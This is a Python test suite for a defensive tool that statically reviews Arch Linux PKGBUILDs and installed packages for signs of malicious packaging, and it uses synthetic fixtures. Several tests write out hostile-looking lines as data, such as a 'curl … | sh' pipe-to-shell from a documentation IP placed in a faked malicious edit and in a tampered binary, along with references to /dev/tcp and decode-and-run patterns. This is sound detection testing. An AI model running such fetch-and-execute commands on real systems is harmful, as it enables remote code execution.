"""Vigil Pkg: static PKGBUILD review. Every input is SYNTHETIC: the PKGBUILD folders in
tests/fixtures/pkg (see its README), text built here, and fake pacman databases
built in temporary folders. Nothing is ever run, built or downloaded."""

import builtins
import gzip
import hashlib
import io
import json
import os
import shutil
import subprocess
import tarfile
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from vigil.core import finding
from vigil.pkg import checks, installed, names, parse, review
from vigil.pkg.server import App

FIX = Path(__file__).parent.parent / "fixtures"
PKG = FIX / "pkg"
ARCH = {"ID": "arch", "PRETTY_NAME": "Arch Linux"}


def run(folder, **kw):
    return review.review_folder(str(PKG / folder), osr=ARCH, save=False, **kw)


def checks_of(rep):
    return {f["check"] for f in rep["findings"]}


def at(rep, check):
    """{"file:line"} where `check` fired."""
    return {f["evidence"][0]["value"] for f in rep["findings"] if f["check"] == check and f["evidence"]}


class ParserTests(unittest.TestCase):
    def test_variables_functions_and_lines(self):
        s = parse.Script((PKG / "builder" / "PKGBUILD").read_text())
        self.assertEqual(s.get("pkgname"), "builder-demo")
        self.assertEqual(s.array("source"), ["https://builder.example.org/builder-demo-0.9.tar.gz"])  # $pkgver expanded
        self.assertEqual(sorted(s.functions), ["build", "package", "prepare"])
        self.assertEqual(s.functions["prepare"]["lines"][1].no, 16)
        self.assertIn("curl -fsSL", s.functions["prepare"]["lines"][1].text)
        self.assertEqual(s.top, [])

    def test_never_evaluates_substitutions(self):
        s = parse.Script("pkgname=x\n_v=$(touch /tmp/vigil-parse-test)\nsource=(\"https://e.example/$_v\")\n")
        self.assertTrue(s.vars["_v"]["subst"])
        self.assertEqual(s.array("source"), ["https://e.example/$(touch /tmp/vigil-parse-test)"])
        self.assertFalse(os.path.exists("/tmp/vigil-parse-test"))

    def test_env_prefixed_commands_and_quoted_assignments(self):
        s = parse.Script('pkgdesc="Has spaces in it"\nCFLAGS="-O2" make install\n')
        self.assertEqual(s.get("pkgdesc"), "Has spaces in it")
        self.assertEqual([x.text for x in s.top], ['CFLAGS="-O2" make install'])

    def test_heredoc_and_braces_in_strings(self):
        s = parse.Script("package() {\n  cat > x.sh <<EOF\nwget http://e.example/y\nEOF\n  echo '}' > /tmp/a\n  true\n}\n")
        texts = [x.text for x in s.functions["package"]["lines"]]
        self.assertIn("  wget http://e.example/y", texts)
        self.assertIn("true", texts)  # the '}' in quotes did not end the function

    def test_source_entries_and_sums(self):
        s = parse.Script((PKG / "sources" / "PKGBUILD").read_text())
        e = parse.source_entries(s)
        self.assertEqual([x["line"] for x in e], [10, 11, 12, 13, 14, 15])
        self.assertEqual(e[1]["name"], "fix.sh")
        self.assertEqual(e[4]["sums"], {"sha256sums": "SKIP"})
        vcs = parse.source_entries(parse.Script((PKG / "benign-vcs" / "PKGBUILD").read_text()))
        self.assertEqual({x["kind"] for x in vcs}, {"vcs"})


class NameTests(unittest.TestCase):
    def test_bait_words_typos_and_known(self):
        self.assertEqual(names.check("firefox-patched")["kind"], "bait")
        self.assertEqual(names.check("zen-browser-patched-bin")["kind"], "known")
        self.assertEqual(names.check("spotify-premium-bin")["word"], "premium")
        self.assertEqual(names.check("fierfox")["like"], "firefox")      # transposition
        self.assertEqual(names.check("discrod")["like"], "discord")
        for fine in ("firefox", "firefox-bin", "librewolf-bin", "zen-browser-bin", "visual-studio-code-bin",
                     "hello-vigil", "python-vigiltool-git", "linux-firmware", "steam-native-runtime"):
            self.assertIsNone(names.check(fine), fine)


class ReviewVerdictTests(unittest.TestCase):
    def test_benign_folders_look_normal(self):
        for folder in ("benign", "benign-vcs"):
            with self.subTest(folder):
                rep = run(folder)
                self.assertEqual(rep["verdict"], "Looks normal")
                self.assertEqual({f["severity"] for f in rep["findings"]}, {"Info"})
                self.assertEqual(checks_of(rep), {"first_review"})
                self.assertNotIn("safe", rep["verdict"].lower())

    def test_squat(self):
        rep = run("squat")
        self.assertEqual(rep["verdict"], "Don't install")
        self.assertEqual(at(rep, "known_malicious"), {"PKGBUILD:4"})
        self.assertEqual(at(rep, "checksum_skip"), {"PKGBUILD:11"})
        f = next(f for f in rep["findings"] if f["check"] == "checksum_skip")
        self.assertIn("program", f["title"])                               # -bin: a prebuilt program

    def test_sources(self):
        rep = run("sources")
        want = {"source_raw_ip": "PKGBUILD:10", "source_pastebin": "PKGBUILD:11", "source_shortener": "PKGBUILD:12",
                "source_file_host": "PKGBUILD:13", "source_plain_http": "PKGBUILD:14",
                "source_other_site": "PKGBUILD:15", "checksum_skip": "PKGBUILD:14"}
        for check, where in want.items():
            self.assertEqual(at(rep, check), {where}, check)
        sev = {f["check"]: f["severity"] for f in rep["findings"]}
        self.assertEqual(sev["source_pastebin"], "High")
        self.assertEqual(sev["source_plain_http"], "Medium")               # no checksum either
        paste = next(f for f in rep["findings"] if f["check"] == "source_pastebin")
        self.assertIn({"type": "url", "value": "https://pastebin.com/raw/Vg1lT3st"}, paste["iocs"])

    def test_builder(self):
        rep = run("builder")
        want = {"pipe_to_shell": "PKGBUILD:16", "decode_and_run": "PKGBUILD:25", "eval": "PKGBUILD:24",
                "chmod_run": "PKGBUILD:27", "dev_tcp": "PKGBUILD:28", "encoded_blob": "PKGBUILD:33",
                "registry_in_build": "PKGBUILD:29"}
        for check, where in want.items():
            self.assertEqual(at(rep, check), {where}, check)
        self.assertEqual(at(rep, "network_in_build"), {"PKGBUILD:17", "PKGBUILD:18", "PKGBUILD:19"})
        # curl | bash on line 16 is one finding, not also "downloads while building"
        self.assertNotIn("PKGBUILD:16", at(rep, "network_in_build"))
        self.assertNotIn("PKGBUILD:28", at(rep, "write_outside"))         # exec 3<>/dev/tcp is not a file write
        self.assertEqual(rep["verdict"], "Don't install")

    def test_install_script(self):
        rep = run("installer")
        F = "installer-demo.install"
        want = {"install_network": 5, "install_service": 4, "install_privilege": 6, "install_cron": 7,
                "install_setuid": 8, "security_off": 9, "install_user_add": 3}
        for check, line in want.items():
            self.assertIn(f"{F}:{line}", at(rep, check), check)
        sev = {f["check"]: f["severity"] for f in rep["findings"]}
        self.assertEqual(sev["install_user_add"], "Info")                  # useradd -r: a system account
        sudoers = [f for f in rep["findings"] if f["check"] == "write_outside" and f["severity"] == "High"]
        self.assertEqual({f["evidence"][0]["value"] for f in sudoers}, {f"{F}:10"})
        self.assertEqual(rep["package"]["install"], [F])

    def test_outside_pkgdir_sudo_and_home(self):
        rep = run("outside")
        self.assertEqual(at(rep, "sudo"), {"PKGBUILD:15"})
        self.assertEqual(at(rep, "user_service"), {"PKGBUILD:19"})
        high = {f["evidence"][0]["value"] for f in rep["findings"] if f["check"] == "write_outside" and f["severity"] == "High"}
        self.assertEqual(high, {"PKGBUILD:16", "PKGBUILD:17", "PKGBUILD:18"})
        medium = {f["evidence"][0]["value"] for f in rep["findings"] if f["check"] == "write_outside" and f["severity"] == "Medium"}
        self.assertIn("PKGBUILD:14", medium)
        self.assertNotIn("PKGBUILD:20", medium | high)                     # "$pkgdir/usr/bin/..." is fine

    def test_top_level_code(self):
        rep = run("toplevel")
        sub = {f["evidence"][0]["value"]: f["severity"] for f in rep["findings"] if f["check"] == "top_level_substitution"}
        self.assertEqual(sub, {"PKGBUILD:10": "Low", "PKGBUILD:11": "High"})
        self.assertEqual(at(rep, "top_level_command"), {"PKGBUILD:14"})
        self.assertFalse(os.path.exists("/tmp/vigil-test-should-never-exist"))

    def test_srcinfo_mismatch(self):
        rep = run("srcinfo")
        self.assertIn("srcinfo_mismatch", checks_of(rep))
        self.assertEqual(rep["verdict"], "Review these lines")
        self.assertNotIn("srcinfo_mismatch", checks_of(run("benign")))     # a matching .SRCINFO is quiet

    def test_evidence_points_at_the_exact_line(self):
        for folder in ("sources", "builder", "installer", "outside", "toplevel"):
            rep = run(folder)
            for f in rep["findings"]:
                ev = f["evidence"][0] if f["evidence"] else None
                if not ev or ":" not in ev["value"]:
                    continue
                file, line = ev["value"].rsplit(":", 1)
                text = (PKG / folder / file).read_text().split("\n")[int(line) - 1].strip()
                self.assertEqual(ev["note"], text[:300], f"{folder} {f['check']}")

    def test_every_finding_follows_the_suite_format(self):
        for folder in sorted(p.name for p in PKG.iterdir() if p.is_dir()):
            for f in run(folder)["findings"]:
                with self.subTest(folder=folder, check=f["check"]):
                    self.assertEqual(finding.problems(f), [])
                    self.assertLessEqual(len(f["title"]), 60)
                    self.assertFalse(f["title"].endswith("…"), f["title"])  # titles fit without cutting
                    self.assertEqual(f["source"]["tool"], "pkg")
                    if f["severity"] in ("High", "Medium") and f["evidence"] and ":" in f["evidence"][0]["value"]:
                        cmds = [c["text"] for o in f["fixes"]["check"] for c in o["commands"]]
                        self.assertTrue(any(c.startswith("sed -n ") for c in cmds))
                    for o in f["fixes"]["fix"]:
                        if o["commands"]:
                            self.assertTrue(o["undo"] or o.get("undo_steps"), o["title"])

    def test_dont_install_offers_delete_with_an_undo(self):
        f = next(f for f in run("squat")["findings"] if f["check"] == "known_malicious")
        opt = next(o for o in f["fixes"]["fix"] if o["title"].startswith("Don't build it"))
        self.assertEqual(opt["commands"][0]["text"], f"rm -r {PKG / 'squat'}")
        self.assertTrue(opt["undo"][0]["text"].startswith("git clone https://aur.archlinux.org/librewolf-fix-bin.git"))
        self.assertEqual([t["role"] for t in opt["commands"][0]["tokens"]], ["remove", "flag", "path"])

    def test_pasted_text_without_a_folder(self):
        text = (PKG / "builder" / "PKGBUILD").read_text()
        rep = review.review_files({"PKGBUILD": text}, osr=ARCH, save=False)
        self.assertEqual(rep["verdict"], "Don't install")
        f = rep["findings"][0]
        self.assertFalse(any(o["title"].startswith("Don't build it") for o in f["fixes"]["fix"]))  # no folder to delete


class FolderReadingTests(unittest.TestCase):
    def test_links_programs_and_skipped_dirs(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp, "pkg")
            shutil.copytree(PKG / "benign", d)
            os.symlink("/etc/passwd", d / "passwd")
            (d / "helper").write_bytes(b"\x7fELF\x02\x01\x01" + b"\0" * 64)   # SYNTHETIC: just an ELF header
            (d / ".git").mkdir()
            (d / ".git" / "config").write_text("[core]\n")
            files, notes = review.read_folder(str(d))
            self.assertNotIn("passwd", files)
            self.assertNotIn(".git/config", files)
            self.assertEqual({n["check"] for n in notes}, {"folder_link", "folder_program"})
            rep = review.review_folder(str(d), osr=ARCH, save=False)
            self.assertEqual(rep["verdict"], "Review these lines")
            self.assertIn("folder_link", checks_of(rep))

    def test_missing_pkgbuild(self):
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(ValueError):
                review.read_folder(tmp)

    def test_review_runs_nothing_and_writes_nothing_in_the_folder(self):
        real_open = builtins.open
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp, "pkg")
            for name in ("builder", "installer", "toplevel"):
                shutil.copytree(PKG / name, d / name)
            before = {p: (p.stat().st_mtime_ns, p.read_bytes()) for p in d.rglob("*") if p.is_file()}

            def guarded_open(file, mode="r", *a, **k):
                if any(c in mode for c in "wax+") and str(file).startswith(str(d)):
                    raise AssertionError(f"wrote {file}")
                return real_open(file, mode, *a, **k)
            boom = AssertionError("tried to run something")
            with mock.patch("builtins.open", guarded_open), \
                    mock.patch.object(subprocess, "run", side_effect=boom), \
                    mock.patch.object(subprocess, "Popen", side_effect=boom), \
                    mock.patch.object(os, "system", side_effect=boom), \
                    mock.patch.object(os, "execv", side_effect=boom):
                for name in ("builder", "installer", "toplevel"):
                    review.review_folder(str(d / name), osr=ARCH, save=False)
            after = {p: (p.stat().st_mtime_ns, p.read_bytes()) for p in d.rglob("*") if p.is_file()}
            self.assertEqual(before, after)
        self.assertFalse(os.path.exists("/tmp/vigil-test-should-never-exist"))


class HistoryTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = review.open_store(self.tmp.name)
        self.addCleanup(self.store.close)
        self.dir = Path(self.tmp.name, "hello-vigil")
        shutil.copytree(PKG / "benign", self.dir)

    def test_approve_then_review_the_change(self):
        rep = review.review_folder(str(self.dir), store=self.store, osr=ARCH)
        self.assertIn("first_review", checks_of(rep))
        files, _ = review.read_folder(str(self.dir))
        review.Trusted(self.store).approve("hello-vigil", files, "1.4.2-1")
        p = self.dir / "PKGBUILD"
        text = p.read_text().replace("# Maintainer: Alice Example <alice at example dot org>",
                                     "# Maintainer: Mallory <mallory at example dot com>")
        text = text.replace("  cmake --build build\n", "  cmake --build build\n  curl -s https://203.0.113.9/x | sh\n")
        p.write_text(text)
        rep = review.review_folder(str(self.dir), store=self.store, osr=ARCH)
        self.assertNotIn("first_review", checks_of(rep))
        self.assertIn("new_maintainer", checks_of(rep))
        pipe = next(f for f in rep["findings"] if f["check"] == "pipe_to_shell")
        self.assertIn("new", pipe["tags"])
        self.assertTrue(any(s["kind"] == "changed" for s in pipe["signals"]))
        self.assertEqual(rep["trusted"]["version"], "1.4.2-1")
        self.assertIn("+  curl -s https://203.0.113.9/x | sh", rep["diff"][0]["unified"])
        # the export for Vigil Cases holds the latest findings
        lines = Path(self.tmp.name, "findings.jsonl").read_text().splitlines()
        self.assertIn("pipe_to_shell", {json.loads(x)["check"] for x in lines})

    def test_aur_metadata_signals(self):
        now = time.time()
        aur = {"found": True, "Name": "hello-vigil", "Maintainer": "newbie", "Submitter": "alice",
               "FirstSubmitted": now - 5 * 86400, "LastModified": now - 86400, "NumVotes": 0, "Popularity": 0,
               "_maintainer_oldest": now - 3 * 86400}
        rep = review.review_folder(str(self.dir), osr=ARCH, aur=aur, save=False, now=now)
        got = checks_of(rep)
        for c in ("aur_new_package", "aur_changed_hands", "aur_new_account", "aur_unused"):
            self.assertIn(c, got)
        rep = review.review_folder(str(self.dir), osr=ARCH, aur=dict(aur, Maintainer=None), save=False, now=now)
        self.assertIn("aur_orphan", checks_of(rep))

    def test_aur_info_is_one_explicit_request_per_question(self):
        calls = []

        def fake(url, limit):
            calls.append(url)
            if "/info?" in url:
                return json.dumps({"results": [{"Name": "hello-vigil", "Maintainer": "alice",
                                                "FirstSubmitted": 1000}]}).encode()
            return json.dumps({"results": [{"FirstSubmitted": 1000}, {"FirstSubmitted": 500}]}).encode()
        info = review.aur_info("hello-vigil", fetcher=fake)
        self.assertEqual(info["_maintainer_oldest"], 500)
        self.assertEqual(len(calls), 2)
        self.assertTrue(all(c.startswith("https://aur.archlinux.org/rpc/v5/") for c in calls))
        self.assertIn("arg%5B%5D=hello-vigil", calls[0])


# ---- installed packages: a fake pacman root ----------------------------------------------

def mtree_text(entries):
    lines = ["#mtree", "/set type=file uid=0 gid=0 mode=644"]
    for path, attrs in entries:
        lines.append(f"./{path} " + " ".join(f"{k}={v}" for k, v in attrs.items()))
    return "\n".join(lines) + "\n"


def make_pacman_root(root):
    """A SYNTHETIC pacman database: one official package (in a sync db), and two foreign
    ones, one of them with a known-malicious name and a changed program file."""
    root = Path(root)
    (root / "etc").mkdir(parents=True)
    (root / "etc/os-release").write_text('ID=arch\nPRETTY_NAME="Arch Linux"\n')
    files = {"usr/bin/goodtool": b"#!/bin/sh\necho good\n", "usr/bin/fixtool": b"#!/bin/sh\necho original\n",
             "etc/fixtool.conf": b"a=1\n", "usr/share/fixtool/data": b"data\n"}
    for rel, data in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        os.chmod(p, 0o755 if "bin" in rel else 0o644)

    def pkg(name, ver, packager, paths, backup=()):
        d = root / f"var/lib/pacman/local/{name}-{ver}"
        d.mkdir(parents=True)
        d.joinpath("desc").write_text(
            f"%NAME%\n{name}\n\n%VERSION%\n{ver}\n\n%PACKAGER%\n{packager}\n\n%INSTALLDATE%\n1700000000\n\n"
            f"%BUILDDATE%\n1699990000\n\n%REASON%\n0\n\n" + ("%BACKUP%\n" + "\n".join(f"{b}\tx" for b in backup) + "\n\n" if backup else ""))
        ents = []
        for rel in paths:
            data = files[rel]
            ents.append((rel, {"mode": "755" if "bin" in rel else "644", "size": len(data),
                               "sha256digest": hashlib.sha256(data).hexdigest()}))
        ents.append(("usr/share/fixtool/gone" if name.startswith("librewolf") else "usr/share/none", {"size": 1}))
        with gzip.open(d / "mtree", "wt") as fh:
            fh.write(mtree_text(ents))
    pkg("goodtool", "1.0-1", "Arch Packager <pkgr@archlinux.org>", ["usr/bin/goodtool"])
    pkg("librewolf-fix-bin", "128.0-1", "Unknown Packager", ["usr/bin/fixtool", "etc/fixtool.conf",
                                                            "usr/share/fixtool/data"], backup=["etc/fixtool.conf"])
    pkg("hello-vigil", "1.4.2-1", "Unknown Packager", [])
    sync = root / "var/lib/pacman/sync"
    sync.mkdir(parents=True)
    with tarfile.open(sync / "core.db", "w:gz") as tf:
        for member in ("goodtool-1.0-1/", "goodtool-1.0-1/desc"):
            info = tarfile.TarInfo(member.rstrip("/"))
            info.type = tarfile.DIRTYPE if member.endswith("/") else tarfile.REGTYPE
            data = b"%NAME%\ngoodtool\n"
            info.size = 0 if member.endswith("/") else len(data)
            tf.addfile(info, None if member.endswith("/") else io.BytesIO(data))
    # after install: the program was changed, a config edited (backup: fine), a file deleted
    (root / "usr/bin/fixtool").write_bytes(b"#!/bin/sh\ncurl https://203.0.113.9/x | sh\n")
    (root / "etc/fixtool.conf").write_bytes(b"a=2\n")
    return root


class InstalledTests(unittest.TestCase):
    def test_foreign_known_bad_and_changed_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = make_pacman_root(tmp)
            rep = installed.audit(str(root), ARCH, now=1000.0)
            self.assertTrue(rep["supported"])
            self.assertEqual(rep["how"], "sync")
            self.assertEqual([r["name"] for r in rep["foreign"]], ["hello-vigil", "librewolf-fix-bin"])
            by = {f["check"]: f for f in rep["findings"]}
            self.assertEqual(by["installed_known_malicious"]["severity"], "High")
            fixes = by["installed_known_malicious"]["fixes"]["fix"][0]
            self.assertEqual(fixes["commands"][0]["text"], "sudo pacman -Rns librewolf-fix-bin")
            self.assertTrue(fixes["undo_steps"])
            changed = next(f for f in rep["findings"] if f["subject"] == "installed:librewolf-fix-bin:files")
            self.assertEqual(changed["severity"], "Medium")                 # a program file changed
            paths = {e["value"] for e in changed["evidence"]}
            self.assertIn("/usr/bin/fixtool", paths)
            self.assertIn("/usr/share/fixtool/gone", paths)                  # missing
            self.assertNotIn("/etc/fixtool.conf", paths)                     # backup file: expected to change
            for f in rep["findings"]:
                self.assertEqual(finding.problems(f), [])

    def test_packager_fallback_without_sync_databases(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = make_pacman_root(tmp)
            shutil.rmtree(root / "var/lib/pacman/sync")
            rep = installed.audit(str(root), ARCH)
            self.assertTrue(rep["how"].startswith("packager"))
            self.assertEqual([r["name"] for r in rep["foreign"]], ["hello-vigil", "librewolf-fix-bin"])
            self.assertTrue(rep["note"])

    def test_other_distros_get_their_own_read_only_check(self):
        want = {"fedora": "rpm -Va", "opensuse": "rpm -Va", "ubuntu": "dpkg --verify"}
        with tempfile.TemporaryDirectory() as tmp:
            for name, cmd in want.items():
                osr = dict(line.split("=", 1) for line in (FIX / "os-release" / name).read_text().split("\n") if "=" in line)
                osr = {k: v.strip('"') for k, v in osr.items()}
                rep = installed.audit(tmp, osr)
                self.assertFalse(rep["supported"])
                self.assertEqual(rep["check"][0]["commands"][0]["text"], cmd)


class ServerTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.app = App(f"{self.tmp.name}/data", os_release_path=str(FIX / "os-release" / "arch"),
                       fs_root=str(make_pacman_root(f"{self.tmp.name}/root")))
        self.addCleanup(self.app.close)

    def post(self, route, body):
        return self.app.routes()[("POST", route)]({}, json.dumps(body).encode(), {})

    def test_review_approve_and_status(self):
        d = Path(self.tmp.name, "squat")
        shutil.copytree(PKG / "squat", d)
        rep = self.post("/api/review", {"path": str(d)})
        self.assertEqual(rep["verdict"], "Don't install")
        self.post("/api/trust", {"pkgbase": "librewolf-fix-bin"})
        s = self.app.routes()[("GET", "/api/status")]({})
        self.assertEqual(s["trusted"][0]["pkgbase"], "librewolf-fix-bin")
        self.assertEqual(s["distro"]["family"], "arch")
        rep = self.post("/api/review", {"path": str(d)})
        self.assertEqual(rep["trusted"]["version"], "128.0.3-1")
        self.assertEqual(rep["diff"], [])

    def test_paste_and_bad_input(self):
        rep = self.post("/api/review", {"files": {"PKGBUILD": (PKG / "benign" / "PKGBUILD").read_text()}})
        self.assertEqual(rep["verdict"], "Looks normal")
        from vigil.core.web import BadRequest
        with self.assertRaises(BadRequest):
            self.post("/api/review", {})
        with self.assertRaises(BadRequest):
            self.post("/api/trust", {"pkgbase": "never-reviewed"})

    def test_aur_lookup_only_on_request(self):
        seen = []
        self.app.fetcher = lambda url, limit: seen.append(url) or json.dumps({"results": []}).encode()
        self.post("/api/review", {"path": str(PKG / "benign")})
        self.assertEqual(seen, [])                                            # a review never calls out
        rep = self.post("/api/aur", {"path": str(PKG / "benign")})
        self.assertEqual(len(seen), 1)
        self.assertFalse(rep["aur_lookup"]["found"])

    def test_installed_route(self):
        rep = self.app.routes()[("GET", "/api/installed")]({"verify": "1"})
        self.assertIn("installed_known_malicious", {f["check"] for f in rep["findings"]})



class PageTests(unittest.TestCase):
    def test_page_is_served_on_loopback_with_the_shared_kit(self):
        import http.client
        import threading
        from vigil.pkg import server
        with tempfile.TemporaryDirectory() as tmp:
            app = App(tmp)
            httpd = server.make_server(app, 0)
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            try:
                self.assertEqual(httpd.server_address[0], "127.0.0.1")
                port = httpd.server_address[1]
                for path, want in (("/", b"<title>Vigil Pkg</title>"), ("/static/pkg.js", b"findingList"),
                                   ("/static/findings.js", b"findingCard"), ("/static/style.css", b".verdict")):
                    c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
                    c.request("GET", path, headers={"Host": f"127.0.0.1:{port}"})
                    r = c.getresponse()
                    self.assertEqual(r.status, 200, path)
                    self.assertIn(want, r.read())
                    c.close()
            finally:
                httpd.shutdown()
                httpd.server_close()
                app.close()


if __name__ == "__main__":
    unittest.main()
